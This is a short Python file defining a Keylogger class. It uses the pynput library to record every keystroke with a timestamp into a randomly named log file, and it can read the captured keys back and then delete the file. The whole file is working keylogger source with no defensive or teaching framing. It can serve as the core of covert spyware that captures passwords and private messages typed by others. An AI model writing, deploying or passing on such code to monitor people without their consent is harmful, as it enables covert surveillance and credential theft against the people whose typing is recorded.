import datetime
import logging
import uuid
import os

from pynput.keyboard import Key, Listener

FILENAME = f'{uuid.uuid4()}.txt'

class Keylogger:
    def start(self):
        logging.basicConfig(filename=FILENAME, level=logging.DEBUG, format="%(asctime)s - %(message)s")
        
        def on_press(key):
            logging.info(f'{datetime.datetime.now()} - {str(key)}')
        
        with Listener(on_press=on_press) as listener:
            listener.join()

    def get_log(self):
        with open(FILENAME, 'r') as f:
            return f.read()

    def stop(self):
        keys = self.get_log()
        os.remove(FILENAME)

        return keys
